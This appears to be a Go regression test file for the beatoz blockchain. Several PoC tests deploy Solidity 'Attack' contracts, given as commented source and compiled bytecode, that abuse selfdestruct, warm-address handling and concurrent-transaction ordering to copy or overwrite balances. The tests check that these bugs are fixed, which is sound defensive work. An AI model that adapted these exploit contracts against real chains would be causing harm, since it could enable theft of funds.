package test

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	types2 "github.com/beatoz/beatoz-go/ctrlers/types"
	"github.com/beatoz/beatoz-go/libs/jsonx"
	"github.com/beatoz/beatoz-go/types"
	"github.com/beatoz/beatoz-go/types/bytes"
	"github.com/beatoz/beatoz-go/types/xerrors"
	"github.com/beatoz/beatoz-sdk-go/vm"
	"github.com/beatoz/beatoz-sdk-go/web3"
	beatozweb3 "github.com/beatoz/beatoz-sdk-go/web3"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/holiman/uint256"
	"github.com/stretchr/testify/require"
	coretypes "github.com/tendermint/tendermint/rpc/core/types"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"sync"
	"testing"
	"time"
)

func requestHttp(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	//fmt.Printf("debug http response : %v\n", string(body))
	return body
}

type AccountQueryResponse struct {
	Jsonrpc string  `json:"jsonrpc"`
	ID      float64 `json:"id"`
	Result  struct {
		Response struct {
			Code      float64     `json:"code"`
			Log       string      `json:"log"`
			Info      string      `json:"info"`
			Index     string      `json:"index"`
			Key       string      `json:"key"`
			Value     string      `json:"value"`
			ProofOps  interface{} `json:"proofOps"`
			Height    string      `json:"height"`
			Codespace string      `json:"codespace"`
		} `json:"response"`
	} `json:"result"`
}

type AccountData struct {
	Address types.Address `json:"address"`
	Nonce   string        `json:"nonce"`
	Balance string        `json:"balance"`
}

func getAccountData(address types.Address) AccountData {
	reqUrl := defaultRpcNode.RPCURL + "/abci_query?path=\"account\"&data=0x" + address.String()
	res := requestHttp(reqUrl)
	var accountRes AccountQueryResponse
	err := jsonx.Unmarshal(res, &accountRes)
	if err != nil {
		log.Fatalf("Error in Unmarshal: %v", err)
	}

	accountValue := accountRes.Result.Response.Value
	decodeAccountValue, _ := base64.StdEncoding.DecodeString(accountValue)

	var accountData AccountData
	err = jsonx.Unmarshal(decodeAccountValue, &accountData)

	return accountData
}

func submitTrx(wallet *web3.Wallet, trx *types2.Trx) []byte {
	wallet.Unlock([]byte("1234"))
	wallet.SignTrxRLP(trx, defaultRpcNode.ChainID)
	encode, _ := trx.Encode()
	return requestHttp(defaultRpcNode.RPCURL + "/broadcast_tx_commit?tx=0x" + hex.EncodeToString(encode))
}

func submitTrxAsync(wallet *web3.Wallet, trx *types2.Trx) []byte {
	wallet.Unlock([]byte("1234"))
	wallet.SignTrxRLP(trx, defaultRpcNode.ChainID)
	encode, _ := trx.Encode()
	return requestHttp(defaultRpcNode.RPCURL + "/broadcast_tx_async?tx=0x" + hex.EncodeToString(encode))
}

/*
contract child {
    constructor () payable {}
    fallback () external payable {
        if(msg.value > 0) return;
        selfdestruct(payable(address(msg.sender)));
    }
}

contract parent {
    constructor () payable {
        address g = address(new child{value: msg.value}());
        for(uint i=0;i<100;i++){
            g.call("");
            g.call{value: address(this).balance}("");
        }
        g.call("");
        selfdestruct(payable(address(msg.sender)));
    }
} */

func TestPoC1(t *testing.T) {
	wallet := randCommonWallet() // don't use randWallet(). if the validator wallet is selected, balance check is fail.
	require.NoError(t, wallet.Unlock(defaultRpcNode.Pass))

	accountData := getAccountData(wallet.Address())

	currentNonce := new(big.Int)
	currentNonce, _ = currentNonce.SetString(accountData.Nonce, 10)

	bzweb3 := randBeatozWeb3()
	require.NoError(t, wallet.SyncAccount(bzweb3))
	fromAddr := wallet.Address()
	nonce := wallet.GetNonce()

	moneyCopyAmt := big.NewInt(0)
	moneyCopyAmt.SetString("1234567890", 10)
	//amt.SetString("100", 10)

	fmt.Printf("my address: %s\n", fromAddr.String())
	fmt.Printf("my balance: %s\n", accountData.Balance)

	// create selfdestructContract
	selfdestructContract, _ := hex.DecodeString("6080604052600034604051610013906101a5565b6040518091039082f0905080158015610030573d6000803e3d6000fd5b50905060005b6064811015610123578173ffffffffffffffffffffffffffffffffffffffff16604051610062906101e2565b6000604051808303816000865af19150503d806000811461009f576040519150601f19603f3d011682016040523d82523d6000602084013e6100a4565b606091505b5050508173ffffffffffffffffffffffffffffffffffffffff16476040516100cb906101e2565b60006040518083038185875af1925050503d8060008114610108576040519150601f19603f3d011682016040523d82523d6000602084013e61010d565b606091505b505050808061011b90610230565b915050610036565b508073ffffffffffffffffffffffffffffffffffffffff16604051610147906101e2565b6000604051808303816000865af19150503d8060008114610184576040519150601f19603f3d011682016040523d82523d6000602084013e610189565b606091505b5050503373ffffffffffffffffffffffffffffffffffffffff16ff5b606d8061027983390190565b600081905092915050565b50565b60006101cc6000836101b1565b91506101d7826101bc565b600082019050919050565b60006101ed826101bf565b9150819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b600061023b82610226565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361026d5761026c6101f7565b5b60018201905091905056fe6080604052605c8060116000396000f3fe6080604052600034116024573373ffffffffffffffffffffffffffffffffffffffff16ff5b00fea2646970667358221220b92a15064194560a6285b178c031a892ddbaba26382aeb676c12fa86377d938d64736f6c63430008130033")
	copyAmtEncode, _ := uint256.FromBig(moneyCopyAmt)
	trxObj := web3.NewTrxContract(fromAddr, types.ZeroAddress(), nonce, contractGas, defGasPrice, copyAmtEncode, selfdestructContract)

	commitRet, err := wallet.SendTxCommit(trxObj, bzweb3)
	require.NoError(t, err)
	require.Equal(t, xerrors.ErrCodeSuccess, commitRet.CheckTx.Code, commitRet.CheckTx.Log)
	require.Equal(t, xerrors.ErrCodeSuccess, commitRet.DeliverTx.Code, commitRet.DeliverTx.Log)
	fmt.Println("TestPoC1", "deploy contract - gas used", commitRet.DeliverTx.GasUsed, "wanted", commitRet.DeliverTx.GasWanted)
	fmt.Println("TestPoC1", "deploy contract - fee used", types.GasToFee(commitRet.DeliverTx.GasUsed, defGasPrice))

	//submitTrx(wallet, trxObj)
	//fmt.Printf("%s\n", submitTrx(wallet, trxObj))

	fmt.Println("[after]")
	sdContractAddr := crypto.CreateAddress(wallet.Address().Array20(), uint64(nonce))
	accountData3 := getAccountData(sdContractAddr[:])
	fmt.Printf("contract A: %s\n", sdContractAddr.String())
	fmt.Printf("contract balance: %s\n", accountData3.Balance)
	nonce += 1

	accountData2 := getAccountData(wallet.Address())
	fmt.Printf("my address: %s\n", fromAddr.String())
	fmt.Printf("my balance: %s\n", accountData2.Balance)
	fmt.Println("my balance(original)", accountData.Balance)

	cmpBal := new(uint256.Int).Sub(uint256.MustFromDecimal(accountData.Balance), uint256.MustFromDecimal(accountData2.Balance)).Sign()
	require.True(t, cmpBal > 0, accountData.Balance, accountData2.Balance)
}

// TestPoc2 uses the following contracts.
// This test case is related to issue #66.
//
//	contract Attack {
//	   constructor () payable {
//	       Caller caller = new Caller(); // nonce = 1
//
//	       // uint8 nonce = 0x02;
//	       // b = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(this), bytes1(nonce))))));
//	       // address(c).call(abi.encodeWithSelector(Caller.revertCall.selector, b)); // make warm address
//
//	       address victim = 0x000000000000000000000000000000000000dEaD;
//	       address(caller).call(abi.encodeWithSelector(Caller.revertCall.selector, victim)); // make warm address
//	       victim.call{value: 1}(""); // set balance 1
//	   }
//	}
//
//	contract Caller {
//	   function revertCall(address target) external {
//	       target.call("");
//	       require(target == address(this)); // force revert
//	   }
//	}
func TestPoC2(t *testing.T) {
	wallet := randWallet()
	require.NoError(t, wallet.Unlock(defaultRpcNode.Pass))
	//wallet, _ := web3.OpenWallet(libs.NewFileReader("/tmp/key"))
	//wallet.Unlock([]byte("1234"))

	accountData := getAccountData(wallet.Address())
	currentNonce := new(big.Int)
	currentNonce, _ = currentNonce.SetString(accountData.Nonce, 10)

	bzweb3 := randBeatozWeb3()
	require.NoError(t, wallet.SyncAccount(bzweb3))
	fromAddr := wallet.Address()
	nonce := wallet.GetNonce()

	//gas := big.NewInt(0)
	//gas.SetString("10000000000000000", 10)
	_amt := uint256.MustFromDecimal("10000000000000000")
	_usedGas := int64(0)

	victimAddress, _ := types.HexToAddress("0x000000000000000000000000000000000000dEaD")
	transferTrx := web3.NewTrxTransfer(fromAddr, victimAddress, nonce, defGas, defGasPrice, _amt)
	//submitTrx(wallet, transferTrx)
	retCommit, err := wallet.SendTxCommit(transferTrx, bzweb3)
	require.NoError(t, err)
	require.Equal(t, xerrors.ErrCodeSuccess, retCommit.CheckTx.Code, retCommit.CheckTx.Log)
	require.Equal(t, xerrors.ErrCodeSuccess, retCommit.DeliverTx.Code, retCommit.DeliverTx.Log)

	_usedGas = retCommit.DeliverTx.GasUsed
	nonce += 1

	victimAcData := getAccountData(victimAddress)
	beforeBalance := victimAcData.Balance
	fmt.Printf("victim balance: %s\n", victimAcData.Balance)
	time.Sleep(1 * time.Second)

	fmt.Printf("[victim balance to 1 in deploying contract]\n")
	selfdestructContract, _ := hex.DecodeString("6080604052600060405161001290610188565b604051809103906000f08015801561002e573d6000803e3d6000fd5b509050600061dead90508173ffffffffffffffffffffffffffffffffffffffff166380f9c68560e01b8260405160240161006891906101d6565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516100d29190610262565b6000604051808303816000865af19150503d806000811461010f576040519150601f19603f3d011682016040523d82523d6000602084013e610114565b606091505b5050508073ffffffffffffffffffffffffffffffffffffffff16600160405161013c9061029f565b60006040518083038185875af1925050503d8060008114610179576040519150601f19603f3d011682016040523d82523d6000602084013e61017e565b606091505b50505050506102b4565b61021b8061030183390190565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101c082610195565b9050919050565b6101d0816101b5565b82525050565b60006020820190506101eb60008301846101c7565b92915050565b600081519050919050565b600081905092915050565b60005b8381101561022557808201518184015260208101905061020a565b60008484015250505050565b600061023c826101f1565b61024681856101fc565b9350610256818560208601610207565b80840191505092915050565b600061026e8284610231565b915081905092915050565b50565b60006102896000836101fc565b915061029482610279565b600082019050919050565b60006102aa8261027c565b9150819050919050565b603f806102c26000396000f3fe6080604052600080fdfea264697066735822122004cbec8f42d807b744d1abeee4052e46587d5710408930a2edc0fbe543f0a01964736f6c63430008120033608060405234801561001057600080fd5b506101fb806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c806380f9c68514610030575b600080fd5b61004a60048036038101906100459190610152565b61004c565b005b8073ffffffffffffffffffffffffffffffffffffffff1660405161006f906101b0565b6000604051808303816000865af19150503d80600081146100ac576040519150601f19603f3d011682016040523d82523d6000602084013e6100b1565b606091505b5050503073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16146100ec57600080fd5b50565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061011f826100f4565b9050919050565b61012f81610114565b811461013a57600080fd5b50565b60008135905061014c81610126565b92915050565b600060208284031215610168576101676100ef565b5b60006101768482850161013d565b91505092915050565b600081905092915050565b50565b600061019a60008361017f565b91506101a58261018a565b600082019050919050565b60006101bb8261018d565b915081905091905056fea2646970667358221220d70ff81326f852813449940c219fdecbf56b4fedca68730017a4bcbe7784be1664736f6c63430008120033")
	trxObj := web3.NewTrxContract(fromAddr, types.ZeroAddress(), nonce, contractGas, defGasPrice, uint256.NewInt(1), selfdestructContract)
	//submitTrx(wallet, trxObj)
	retCommit, err = wallet.SendTxCommit(trxObj, bzweb3)
	require.NoError(t, err)
	require.Equal(t, xerrors.ErrCodeSuccess, retCommit.CheckTx.Code, retCommit.CheckTx.Log)
	require.Equal(t, xerrors.ErrCodeSuccess, retCommit.DeliverTx.Code, retCommit.DeliverTx.Log)

	_usedGas = retCommit.DeliverTx.GasUsed

	time.Sleep(1 * time.Second)
	victimAcData = getAccountData(victimAddress)
	fmt.Printf("victim balance: %s\n", victimAcData.Balance)

	// Before auto-burning is applied, the following code should pass.
	// After enabling auto-burning (which transfers `100 - GovParams.TxFeeRewardRate` percent of the transaction fee to 0x00..dEaD,
	// the address used as the victimAddress in the Attack contract),
	// the balance of victimAddress no longer matches the expected value below.

	// require.Equal(t, "10000000000000001", victimAcData.Balance)
	_usedFee := types.GasToFee(_usedGas, defGasPrice)
	_deadFee := new(uint256.Int).Mul(_usedFee, uint256.NewInt(uint64(100-defGovParams.TxFeeRewardRate())))
	_deadFee = new(uint256.Int).Div(_deadFee, uint256.NewInt(100))
	expectedBalance := uint256.MustFromDecimal(beforeBalance)
	expectedBalance.Add(expectedBalance, uint256.NewInt(1)) // transferred in deploying contract
	_ = expectedBalance.Add(expectedBalance, _deadFee)
	require.Equal(t, expectedBalance.Dec(), victimAcData.Balance)
}

/*
	contract Attack {
	    constructor () payable {}

	    function empty() public {
	        address someone = 0x000000000000000000000000000000000000FEfe;
	        // someone.call{value: address(this).balance}(""); // send all balance to someone
	        selfdestruct(payable(address(someone)));
	    }
	}
*/
func TestPoc3(t *testing.T) {
	wallet := randWallet()
	require.NoError(t, wallet.Unlock(defaultRpcNode.Pass))

	accountData := getAccountData(wallet.Address())
	currentNonce := new(big.Int)
	currentNonce, _ = currentNonce.SetString(accountData.Nonce, 10)

	require.NoError(t, wallet.SyncAccount(randBeatozWeb3()))
	fromAddr := wallet.Address()
	nonce := wallet.GetNonce()

	//gas := big.NewInt(0)
	//gas.SetString("10000000000000000", 10)
	//gasEncode, _ := uint256.FromBig(gas)
	_amt := uint256.MustFromDecimal("10000000000000000")

	selfdestructContract, _ := hex.DecodeString("6080604052608b8060116000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063f2a75fe414602d575b600080fd5b60336035565b005b600061fefe90508073ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212201e32548a0b90b02cfc3f8f25d922823a580c1c4839c2663b0b714fdebdd1014164736f6c63430008100033")
	//selfdestructContract, _ := hex.DecodeString("6080604052608b8060116000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063f2a75fe414602d575b600080fd5b60336035565b005b600061fefe90508073ffffffffffffffffffffffffffffffffffffffff16fffea264697066735822122006ac63568a8a89b4d90fe512fe76fb87c6f6f951443e0302939b87e795198d7264736f6c63430008100033")
	trxObj := web3.NewTrxContract(fromAddr, types.ZeroAddress(), nonce, contractGas, defGasPrice, _amt, selfdestructContract)
	retbz := submitTrx(wallet, trxObj)

	resp := &struct {
		Version string          `json:"version"`
		Id      int32           `json:"id"`
		Result  json.RawMessage `json:"result"`
		Error   json.RawMessage `json:"error"`
	}{}

	err := jsonx.Unmarshal(retbz, resp)
	require.NoError(t, err, string(retbz))
	resp2 := &coretypes.ResultBroadcastTxCommit{}
	err = jsonx.Unmarshal(resp.Result, resp2)
	require.NoError(t, err, string(resp.Result))

	require.Greater(t, len(resp2.DeliverTx.Events), 1)

	var contractAddr types.Address
	for _, evt := range resp2.DeliverTx.Events {
		if evt.Type == "evm" {
			require.GreaterOrEqual(t, len(evt.Attributes), 1)
			require.Equal(t, "contractAddress", string(evt.Attributes[0].Key), string(evt.Attributes[0].Key))
			require.Equal(t, 40, len(evt.Attributes[0].Value), string(evt.Attributes[0].Value))
			contractAddr, err = types.HexToAddress(string(evt.Attributes[0].Value))
			require.NoError(t, err)
		}
	}

	fmt.Println("contract address", contractAddr)
	contAcct := getAccountData(contractAddr)
	fmt.Println("contract balance", contAcct.Balance)
	require.Equal(t, _amt.Dec(), contAcct.Balance)

	//
	// If the contract has no fallback payable function,
	// the transferring tx is reverted.
	// is it right???? ==> yes
	//
	nonce++
	transferTrx := web3.NewTrxTransfer(fromAddr, contractAddr, nonce, bigGas, defGasPrice, _amt)
	retbz = submitTrx(wallet, transferTrx)
	err = jsonx.Unmarshal(retbz, resp)
	require.NoError(t, err)
	resp2 = &coretypes.ResultBroadcastTxCommit{}
	err = jsonx.Unmarshal(resp.Result, resp2)
	require.NoError(t, err)
	require.Equal(t, xerrors.ErrCodeSuccess, resp2.CheckTx.Code, resp2.CheckTx.Log)
	require.Equal(t, xerrors.ErrCodeDeliverTx, resp2.DeliverTx.Code)
	nonce--

	contAcct = getAccountData(contractAddr)
	require.Equal(t, _amt.Dec(), contAcct.Balance)

	someoneAddr, _ := types.HexToAddress("0x000000000000000000000000000000000000FEfe")
	someoneAcct := getAccountData(someoneAddr)
	fmt.Println("someoneAddr balance", someoneAcct.Balance)

	data := bytes.HexBytes(crypto.Keccak256([]byte("empty()")))
	data = data[:4]

	nonce++
	tx := web3.NewTrxContract(fromAddr, contractAddr, nonce, contractGas, defGasPrice, uint256.NewInt(0), data)
	retbz = submitTrx(wallet, tx)
	err = jsonx.Unmarshal(retbz, resp)
	require.NoError(t, err)
	resp2 = &coretypes.ResultBroadcastTxCommit{}
	err = jsonx.Unmarshal(resp.Result, resp2)
	require.NoError(t, err)

	contAcct = getAccountData(contractAddr)
	fmt.Println("contract balance", contAcct.Balance)
	require.Equal(t, "0", contAcct.Balance)

	someoneAcct = getAccountData(someoneAddr)
	fmt.Println("someoneAddr balance", someoneAcct.Balance)
	require.Equal(t, _amt.Dec(), someoneAcct.Balance)
}

func TestPoC4(t *testing.T) {
	// the contract tx to EOA (not contract address) is rejected.
	// so, the following test is not available.
	return

	bzweb3 := beatozweb3.NewBeatozWeb3(beatozweb3.NewHttpProvider(defaultRpcNode.RPCURL))

	walletMain := randCommonWallet() // don't use randWallet(). if the validator wallet is selected, balance check is fail.
	require.NoError(t, walletMain.Unlock(defaultRpcNode.Pass))
	require.NoError(t, walletMain.SyncAccount(bzweb3))

	expectedMainBalance := walletMain.GetBalance().Clone()
	fmt.Println("initial balance of walletMain: ", walletMain.GetBalance().Dec())

	walletMoneCopy := web3.NewWallet(defaultRpcNode.Pass)
	walletA := web3.NewWallet(defaultRpcNode.Pass)
	walletB := web3.NewWallet(defaultRpcNode.Pass)

	fmt.Printf("walletMain: %s\n", walletMain.Address())
	fmt.Printf("walletA: %s\n", walletA.Address())
	fmt.Printf("walletB: %s\n", walletB.Address())
	fmt.Printf("walletMoneCopy: %s\n", walletMoneCopy.Address())

	fmt.Println("[send gas fee]")
	{
		amtx := uint256.MustFromDecimal("100000000000000000000")

		ret, err := walletMain.TransferCommit(walletA.Address(), defGas, defGasPrice, amtx, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeSuccess, ret.CheckTx.Code, ret.CheckTx.Log)
		require.Equal(t, xerrors.ErrCodeSuccess, ret.DeliverTx.Code, ret.DeliverTx.Log)

		_ = expectedMainBalance.Sub(expectedMainBalance, baseFee)
		_ = expectedMainBalance.Sub(expectedMainBalance, amtx)

		walletMain.AddNonce()
		ret, err = walletMain.TransferCommit(walletB.Address(), defGas, defGasPrice, amtx, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeSuccess, ret.CheckTx.Code, ret.CheckTx.Log)
		require.Equal(t, xerrors.ErrCodeSuccess, ret.DeliverTx.Code, ret.DeliverTx.Log)

		_ = expectedMainBalance.Sub(expectedMainBalance, baseFee)
		_ = expectedMainBalance.Sub(expectedMainBalance, amtx)

	}

	require.NoError(t, walletMain.SyncAccount(bzweb3))
	require.Equal(t, expectedMainBalance.Dec(), walletMain.GetBalance().Dec())
	fmt.Println("before balance of walletMain: ", walletMain.GetBalance().Dec())

	require.NoError(t, walletMoneCopy.SyncAccount(bzweb3))
	fmt.Println("before balance of walletMoneCopy: ", walletMoneCopy.GetBalance().Dec())

	require.NoError(t, walletA.SyncAccount(bzweb3))
	require.NoError(t, walletB.SyncAccount(bzweb3))

	// set accessedObjAddrs - walletMain
	bytedata, _ := hex.DecodeString("1234")
	trx1 := web3.NewTrxContract(walletB.Address(), walletMain.Address(), walletB.GetNonce(), bigGas, defGasPrice, uint256.MustFromDecimal("1"), bytedata)
	_ = expectedMainBalance.Add(expectedMainBalance, uint256.MustFromDecimal("1"))

	// transfer all money to walletMoneCopy with NewTrxTransfer
	// now, beatoz state is changed but evm state is not changed
	amt0 := new(uint256.Int).Sub(walletMain.GetBalance(), baseFee)
	trx2 := web3.NewTrxTransfer(walletMain.Address(), walletMoneCopy.Address(), walletMain.GetNonce(), defGas, defGasPrice, amt0)
	_ = expectedMainBalance.Sub(expectedMainBalance, baseFee)
	_ = expectedMainBalance.Sub(expectedMainBalance, amt0)

	// use evm stated(accessedObjAddrs[walletMain] is true)
	// overwrite walletMain's state(balance)
	trx3 := web3.NewTrxContract(walletA.Address(), walletMain.Address(), walletA.GetNonce(), bigGas, defGasPrice, uint256.MustFromDecimal("1"), bytedata)
	_ = expectedMainBalance.Add(expectedMainBalance, uint256.MustFromDecimal("1"))

	wg := sync.WaitGroup{}
	wg.Add(1)
	go func() {
		// tx order 1
		require.NoError(t, walletB.Unlock(defaultRpcNode.Pass))
		retAsync, err := walletB.SendTxAsync(trx1, bzweb3)
		require.NoError(t, err)
		//submitTrxAsync(walletB, trx1)

		retTx, err := waitTrxResult(retAsync.Hash, 60, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeSuccess, retTx.TxResult.Code, retTx.TxResult.Log)

		wg.Done()

		fmt.Println("tx0", retTx.Hash, "height", retTx.Height)
	}()
	wg.Add(1)
	go func() {
		time.Sleep(10 * time.Millisecond) // tx order 2
		retAsync, err := walletMain.SendTxAsync(trx2, bzweb3)
		require.NoError(t, err)
		//submitTrxAsync(walletMain, trx2)

		retTx, err := waitTrxResult(retAsync.Hash, 60, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeSuccess, retTx.TxResult.Code, retTx.TxResult.Log)

		wg.Done()
		fmt.Println("tx1", retTx.Hash, "height", retTx.Height)
	}()
	wg.Add(1)
	go func() {
		time.Sleep(20 * time.Millisecond) // tx order 3
		require.NoError(t, walletA.Unlock(defaultRpcNode.Pass))

		retAsync, err := walletA.SendTxAsync(trx3, bzweb3)
		require.NoError(t, err)
		//submitTrxAsync(walletA, trx3)

		retTx, err := waitTrxResult(retAsync.Hash, 60, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeSuccess, retTx.TxResult.Code, retTx.TxResult.Log)

		wg.Done()
		fmt.Println("tx2", retTx.Hash, "height", retTx.Height)
	}()

	wg.Wait()

	require.NoError(t, walletMain.SyncAccount(bzweb3))
	require.Equal(t, expectedMainBalance.Dec(), walletMain.GetBalance().Dec())
	fmt.Println("after0 balance of walletMain: ", walletMain.GetBalance().Dec())

	require.NoError(t, walletMoneCopy.SyncAccount(bzweb3))
	fmt.Println("after0 balance of walletMoneCopy: ", walletMoneCopy.GetBalance().Dec())

	require.NoError(t, walletMoneCopy.Unlock(defaultRpcNode.Pass))
	amt0 = new(uint256.Int).Sub(walletMoneCopy.GetBalance(), baseFee)
	ret, err := walletMoneCopy.TransferCommit(walletMain.Address(), defGas, defGasPrice, amt0, bzweb3)
	require.NoError(t, err)
	require.Equal(t, xerrors.ErrCodeSuccess, ret.CheckTx.Code, ret.CheckTx.Log)
	require.Equal(t, xerrors.ErrCodeSuccess, ret.DeliverTx.Code, ret.DeliverTx.Log)

	_ = expectedMainBalance.Add(expectedMainBalance, amt0)

	time.Sleep(2 * time.Second)

	require.NoError(t, walletMain.SyncAccount(bzweb3))
	fmt.Println("after1 balance of walletMain: ", walletMain.GetBalance().Dec())
	require.Equal(t, expectedMainBalance.Dec(), walletMain.GetBalance().Dec())

	require.NoError(t, walletMoneCopy.SyncAccount(bzweb3))
	fmt.Println("after1 balance of walletMoneCopy: ", walletMoneCopy.GetBalance().Dec())
	require.Equal(t, "0", walletMoneCopy.GetBalance().Dec())
	return
}

func TestPoC5(t *testing.T) {
	bzweb3 := beatozweb3.NewBeatozWeb3(beatozweb3.NewHttpProvider(defaultRpcNode.RPCURL))
	for i, w := range validatorWallets {
		require.NoError(t, w.SyncAccount(bzweb3))
		fmt.Println("validator", i, w.Address(), w.GetBalance())
	}

	w0 := wallets[0]
	require.NoError(t, w0.Unlock(defaultRpcNode.Pass))
	require.NoError(t, w0.SyncAccount(bzweb3))
	fmt.Println("w0", w0.Address(), "balance", w0.GetBalance().Dec())

	w1 := wallets[1]
	require.NoError(t, w1.Unlock(defaultRpcNode.Pass))
	require.NoError(t, w1.SyncAccount(bzweb3))
	fmt.Println("w1", w1.Address(), "balance", w1.GetBalance().Dec())

	w2 := wallets[2]
	require.NoError(t, w2.Unlock(defaultRpcNode.Pass))
	require.NoError(t, w2.SyncAccount(bzweb3))
	fmt.Println("w2", w2.Address(), "balance", w2.GetBalance().Dec())

	targetWallet := wallets[3]
	require.NoError(t, targetWallet.Unlock(defaultRpcNode.Pass))
	require.NoError(t, targetWallet.SyncAccount(bzweb3))
	fmt.Println("targetWallet", targetWallet.Address(), "balance", targetWallet.GetBalance().Dec())
	expectedTargetWalletBalance := targetWallet.GetBalance().Clone()

	gasSum := uint64(0)

	contract, err := vm.NewEVMContract("./abi_poc5.json")
	require.NoError(t, err)

	ret, err := contract.ExecCommit("", nil, w0, w0.GetNonce(), contractGas, defGasPrice, uint256.NewInt(1_000_000), bzweb3)
	require.NoError(t, err)
	require.Equal(t, xerrors.ErrCodeSuccess, ret.CheckTx.Code, ret.CheckTx.Log)
	require.Equal(t, xerrors.ErrCodeSuccess, ret.DeliverTx.Code, ret.DeliverTx.Log)
	require.NotNil(t, contract.GetAddress())

	fmt.Printf("Set contract address: %x\n", contract.GetAddress())
	fmt.Println("tx_", ret.Hash, "height", ret.Height, "deploy used gas", ret.DeliverTx.GasUsed)
	gasSum += uint64(ret.DeliverTx.GasUsed)

	contAcct := getAccountData(contract.GetAddress())
	fmt.Printf("Contract balance: %v\n", contAcct.Balance)

	// first tx - evm tx
	wg := sync.WaitGroup{}
	wg.Add(1)
	go func() {
		w0.AddNonce()
		txhash, err := contract.ExecAsync("transferAsset", []interface{}{targetWallet.Address().Array20()}, w0, w0.GetNonce(), bigGas, defGasPrice, uint256.NewInt(123), bzweb3)
		require.NoError(t, err)

		retTx, err := waitTrxResult(txhash, 30, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeSuccess, retTx.TxResult.Code, retTx.TxResult.Log)

		_ = expectedTargetWalletBalance.Add(expectedTargetWalletBalance, uint256.NewInt(123))
		wg.Done()

		fmt.Println("tx0", retTx.Hash, "height", retTx.Height, "index", retTx.Index, "transfer(contract) used gas", retTx.TxResult.GasUsed)
		gasSum += uint64(retTx.TxResult.GasUsed)
	}()

	// second tx - beatoz account tx
	wg.Add(1)
	go func() {
		time.Sleep(10 * time.Millisecond) // tx order 2
		retAsync, err := w1.TransferAsync(targetWallet.Address(), defGas, defGasPrice, uint256.NewInt(123), bzweb3)
		require.NoError(t, err)

		retTx, err := waitTrxResult(retAsync.Hash, 30, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeSuccess, retTx.TxResult.Code, retTx.TxResult.Log)

		_ = expectedTargetWalletBalance.Add(expectedTargetWalletBalance, uint256.NewInt(123))
		wg.Done()

		fmt.Println("tx1", retTx.Hash, "height", retTx.Height, "index", retTx.Index, "transfer used gas", retTx.TxResult.GasUsed)
		gasSum += uint64(retTx.TxResult.GasUsed)
	}()

	// third tx - evm tx (revert)
	wg.Add(1)
	go func() {
		time.Sleep(20 * time.Millisecond) // tx order 2
		txhash, err := contract.ExecAsync("callRevert", nil, w2, w2.GetNonce(), bigGas, defGasPrice, uint256.NewInt(0), bzweb3)
		require.NoError(t, err)

		retTx, err := waitTrxResult(txhash, 30, bzweb3)
		require.NoError(t, err)
		require.Equal(t, xerrors.ErrCodeDeliverTx, retTx.TxResult.Code, retTx.TxResult.Log)

		wg.Done()

		fmt.Println("tx2", retTx.Hash, "height", retTx.Height, "index", retTx.Index, "callRevert used gas", retTx.TxResult.GasUsed)
		gasSum += uint64(retTx.TxResult.GasUsed)
	}()

	wg.Wait()

	if isValidator(targetWallet.Address()) {
		feeSum := new(uint256.Int).Mul(uint256.NewInt(gasSum), defGasPrice)
		_ = expectedTargetWalletBalance.Add(expectedTargetWalletBalance, feeSum)
	}

	require.NoError(t, targetWallet.SyncAccount(bzweb3))
	// When targetWallet is validator, diff:3,146,750,000,000,000
	//fmt.Println("expected", expectedTargetWalletBalance.Dec(), "actual", targetWallet.GetBalance().Dec())
	require.Equal(t, expectedTargetWalletBalance.Dec(), targetWallet.GetBalance().Dec())
}
